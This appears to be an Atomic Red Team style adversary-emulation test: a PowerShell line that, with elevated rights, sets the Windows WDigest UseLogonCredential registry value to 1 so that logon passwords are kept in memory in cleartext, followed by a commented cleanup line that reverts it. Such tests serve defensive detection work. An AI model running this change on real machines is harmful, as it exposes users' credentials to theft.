#Atomic Test #3 - Modify registry to store logon credentials

Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f"'

# Cleanup Commands:
#Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f >nul 2>&1"'